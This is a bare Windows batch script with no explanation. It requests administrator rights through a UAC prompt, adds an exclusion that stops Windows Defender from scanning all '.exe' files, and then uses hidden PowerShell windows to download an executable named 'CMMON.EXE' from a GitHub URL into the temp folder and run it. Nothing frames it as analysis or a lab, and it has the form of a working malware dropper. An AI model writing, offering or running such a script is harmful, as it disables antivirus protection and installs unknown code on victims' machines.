@echo off

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"


Start-Process powershell -ArgumentList "-Command Set-MpPreference -ExclusionExtension exe" -WindowStyle Minimized


cd %TEMP%


Start-Process powershell -ArgumentList "-Command Invoke-WebRequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/CMMON.EXE' -OutFile 'CMMON.EXE'; Start-Process 'CMMON.EXE'" -WindowStyle Minimized

